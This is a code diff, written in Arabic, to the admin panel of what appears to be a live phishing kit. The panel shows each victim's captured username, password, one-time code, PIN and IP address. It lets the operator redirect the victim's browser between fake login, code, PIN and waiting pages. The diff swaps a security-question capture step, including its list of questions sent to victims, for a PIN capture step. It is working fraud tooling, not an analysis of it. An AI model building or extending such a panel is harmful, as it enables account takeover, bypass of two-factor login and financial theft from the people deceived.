@@ -292,8 +292,8 @@ function fmtDate(ts){if(!ts)return'—';try{var d=new Date(ts);
 function statusLabel(o){
   if(o.status==='accepted') return 'مقبول';
   if(o.status==='rejected') return 'مرفوض';
-  if(o.step==='security') return 'سؤال أمان قيد الانتظار';
   if(o.step==='code') return 'كود قيد الانتظار';
+  if(o.step==='pin') return 'رقم سري قيد الانتظار';
   return 'بيانات جديدة';
 }
 function statusColor(st){
@@ -307,8 +307,8 @@ function statusBadge(o){
 }
 function stepBadge(step){
   if(!step)return'';
-  var l=step==='security'?'سؤال الأمان':step==='code'?'الكود':'تسجيل الدخول';
-  var c=step==='security'?'#a855f7':step==='code'?'#0ea5e9':'#f59e0b';
+  var l=step==='code'?'الكود':step==='pin'?'الرقم السري':'تسجيل الدخول';
+  var c=step==='code'?'#0ea5e9':step==='pin'?'#ec4899':'#f59e0b';
   return '<span class="pg-badge" style="background:'+c+'">'+l+'</span>';
 }
 
@@ -343,10 +343,10 @@ function renderActive(){
   el.innerHTML=list.map(function(o){
     var badge=o.step?stepBadge(o.step):statusBadge(o);
     var codeInfo=o.code?'<span style="color:#364abf;font-weight:700">📲 '+esc(o.code)+'</span>':'';
-    var secInfo=o.security_answer?'<span style="color:#a855f7;font-weight:700">🛡️ '+esc(o.security_answer)+'</span>':'';
+    var pinInfo=o.pin?'<span style="color:#ec4899;font-weight:700">🔐 '+esc(o.pin)+'</span>':'';
     return '<div class="ac'+(o.id===selId?' sel':'')+'" onclick="selectOrder(\''+esc(o.id)+'\')">'+
       '<div class="ac-t"><span class="ac-n">'+esc(o.username)+'</span>'+badge+'</div>'+
-      '<div class="ac-info"><span>🔑 '+esc(o.password)+'</span>'+codeInfo+secInfo+'</div></div>';
+      '<div class="ac-info"><span>🔑 '+esc(o.password)+'</span>'+codeInfo+pinInfo+'</div></div>';
   }).join('');
 }
 
@@ -362,6 +362,7 @@ function renderOrders(){
       '<div class="oc-t"><div class="oc-nm">'+esc(o.username)+'</div>'+statusBadge(o)+'</div>'+
       '<div class="oc-info">🔑 '+esc(o.password)+' • 🕐 '+fmtDate(o.time)+'</div>'+
       (o.code?'<div class="oc-code">📲 الكود: '+esc(o.code)+'</div>':'')+
+      (o.pin?'<div class="oc-code" style="color:#ec4899">🔐 الرقم السري: '+esc(o.pin)+'</div>':'')+
       '<button class="oc-del '+(isDC?'confirm':'normal')+'" onclick="event.stopPropagation();oDel(\''+esc(o.id)+'\')">'+(isDC?'⚠️ تأكيد':'✕')+'</button></div>';
   }).join('');
 }
@@ -394,7 +395,7 @@ function renderDetail(o){
   h+=codeCard('👤 اسم المستخدم',o.username);
   h+=codeCard('🔒 كلمة المرور',o.password);
   h+=codeCard('📲 الكود',o.code);
-  h+=securityCard(o.security_question,o.security_answer);
+  h+=codeCard('🔐 الرقم السري',o.pin);
   h+='</div></div>';
 
   h+=updateDataCard(o.update_data);
@@ -404,10 +405,9 @@ function renderDetail(o){
     {icon:'👤',label:'اسم المستخدم',value:o.username},
     {icon:'🔒',label:'كلمة المرور',value:o.password,hl:true},
     {icon:'📲',label:'الكود',value:o.code,hl:true},
+    {icon:'🔐',label:'الرقم السري',value:o.pin,hl:true},
     {icon:'🌐',label:'IP',value:o.ip},
-    {icon:'🛡️',label:'سؤال الأمان',value:o.security_question},
-    {icon:'💬',label:'إجابة الأمان',value:o.security_answer},
-    {icon:'📊',label:'المرحلة',value:o.step==='security'?'سؤال الأمان':o.step==='code'?'الكود':o.step==='update-data'?'تحديث البيانات':'تسجيل الدخول'},
+    {icon:'📊',label:'المرحلة',value:o.step==='code'?'الكود':o.step==='pin'?'الرقم السري':o.step==='update-data'?'تحديث البيانات':'تسجيل الدخول'},
     {icon:'📋',label:'الحالة',value:statusLabel(o)},
     {icon:'🕐',label:'الوقت',value:fmtDate(o.time)}
   ].filter(function(d){return d.value&&d.value!=='—';});
@@ -432,22 +432,11 @@ function renderDetail(o){
       '<button class="btn-ok disabled" disabled>✅ قبول</button>'+
       '<button class="btn-no disabled" disabled>❌ رفض</button></div>';
   }
-  h+='<div style="margin-top:12px;background:rgba(168,85,247,.05);border:1px solid rgba(168,85,247,.15);border-radius:10px;padding:12px">'+
-    '<div style="font-size:12px;font-weight:700;color:#7c3aed;margin-bottom:8px">🛡️ إرسال سؤال أمان للعميل</div>'+
-    '<select id="adminQSelect" style="width:100%;padding:10px 12px;border:1px solid rgba(168,85,247,.25);border-radius:8px;font-size:13px;font-family:Cairo,sans-serif;outline:none;margin-bottom:8px;background:#fff">'+
-    '<option value="">-- اختر سؤال الأمان --</option>'+
-    secQOptions()+
-    '</select>'+
-    '<button style="width:100%;background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;border:none;border-radius:8px;padding:10px;font-size:13px;font-weight:800;cursor:pointer;font-family:Cairo,sans-serif" onclick="sendSecQ(\''+esc(o.id)+'\')">🛡️ إرسال السؤال للعميل</button>'+
-    '</div>';
   h+='<div class="redir-grid" style="margin-top:8px">'+
     '<button style="background:#0ea5e9" onclick="doRedir(\''+esc(o.id)+'\',\'code\')">📲 الكود</button>'+
+    '<button style="background:#ec4899" onclick="doRedir(\''+esc(o.id)+'\',\'pin\')">🔐 الرقم السري</button>'+
     '<button style="background:#f59e0b" onclick="doRedir(\''+esc(o.id)+'\',\'login\')">🔑 تسجيل الدخول</button>'+
     '<button style="background:#7c3aed" onclick="doRedir(\''+esc(o.id)+'\',\'loading\')">⏳ الانتظار</button>'+
-    '</div>';
-  h+='<div class="redir-grid" style="margin-top:6px;grid-template-columns:1fr 1fr">'+
-    '<button style="background:linear-gradient(135deg,#a855f7,#9333ea);font-size:11px" onclick="doRedir(\''+esc(o.id)+'\',\'security\')">🛡️ سؤال الأمان</button>'+
-    '<button style="background:linear-gradient(135deg,#059669,#047857);font-size:11px" onclick="doRedir(\''+esc(o.id)+'\',\'update-data\')">📋 تحديث البيانات</button>'+
     '</div>';
   h+='</div>';
 
@@ -462,17 +451,6 @@ function codeCard(lbl,val){
   if(!val)return '<div class="code-empty"><div class="lbl">'+lbl+'</div><div class="val">لم يُسجل بعد</div></div>';
   return '<div class="code-card"><div class="lbl">'+lbl+'</div><div class="val">'+esc(val)+'</div>'+
     '<button class="cp" data-copy="'+esc(val)+'" onclick="doCopy(this)">📋 نسخ</button></div>';
-}
-
-function securityCard(question,answer){
-  if(!question&&!answer)return '<div class="code-empty" style="grid-column:span 3"><div class="lbl">🛡️ سؤال الأمان</div><div class="val">لم يُسجل بعد</div></div>';
-  return '<div style="grid-column:span 3;background:rgba(168,85,247,.06);border:1.5px solid rgba(168,85,247,.2);border-radius:12px;padding:14px;text-align:center">'+
-    '<div style="font-size:11px;color:#7c3aed;margin-bottom:6px;font-weight:700">🛡️ سؤال الأمان</div>'+
-    '<div style="font-size:14px;font-weight:700;color:#1e293b;margin-bottom:8px;line-height:1.6">'+esc(question||'—')+'</div>'+
-    '<div style="background:#fff;border:1px solid rgba(168,85,247,.2);border-radius:8px;padding:10px;margin-bottom:8px">'+
-    '<div style="font-size:11px;color:#a855f7;margin-bottom:2px;font-weight:600">💬 الإجابة</div>'+
-    '<div style="font-size:18px;font-weight:800;color:#7c3aed;font-family:monospace;direction:ltr">'+esc(answer||'—')+'</div></div>'+
-    '<button class="cp" data-copy="'+esc((question||'')+' → '+(answer||''))+'" onclick="doCopy(this)" style="border:none;background:rgba(168,85,247,.1);color:#7c3aed;border-radius:6px;padding:4px 12px;font-size:10px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif">📋 نسخ الكل</button></div>';
 }
 
 function updateDataCard(raw){
@@ -534,26 +512,9 @@ function doDecide(id,decision){
     showNotif(decision==='accept'?'✅ تم القبول':'❌ تم الرفض');loadData();});
 }
 
-var SEC_QUESTIONS=[
-  'ما هو اسم ابن عمك الأول؟','في أي مدينة ولدت؟','في أي سنة تخرجت من الجامعة؟',
-  'ماذا كان لقبك أثناء الطفولة؟','اسم مؤلفك المفضل؟','اسم الشركة المصنعة للسيارة المفضلة لديك؟',
-  'أي فيلم هو المفضل لديك؟','اسم أفضل صديق في الطفولة؟','في أي عام حصلت على رخصة القيادة الخاصة بك؟',
-  'العلامة التجارية لأول تلفزيون الخاص بك؟','في أي سنة تزوجت؟','اسم فريق كرة القدم المفضل لديك؟',
-  'ما هو اسم المدرسة التي التحقت بها؟','اسم أول بلد أجنبي قمت بزيارته؟','ما هي ماركة سيارتك الأولى؟'
-];
-function secQOptions(){return SEC_QUESTIONS.map(function(q){return '<option value="'+esc(q)+'">'+esc(q)+'</option>';}).join('');}
-
-function sendSecQ(id){
-  var sel=document.getElementById('adminQSelect');
-  if(!sel||!sel.value){showNotif('⚠️ اختر سؤال أولاً');return;}
-  api('POST','/api/admin/send-question/'+id,{question:sel.value}).then(function(r){
-    if(r.ok)showNotif('✅ تم إرسال السؤال للعميل');loadData();
-  });
-}
-
 function doRedir(id,page){
   api('POST','/api/admin/redirect/'+id,{page:page}).then(function(){
-    var labels={security:'سؤال الأمان',code:'الكود',login:'تسجيل الدخول',loading:'الانتظار','update-data':'تحديث البيانات'};
+    var labels={code:'الكود',pin:'الرقم السري',login:'تسجيل الدخول',loading:'الانتظار','update-data':'تحديث البيانات'};
     showNotif('✅ تم إعادة التوجيه إلى: '+(labels[page]||page));loadData();});
 }
 
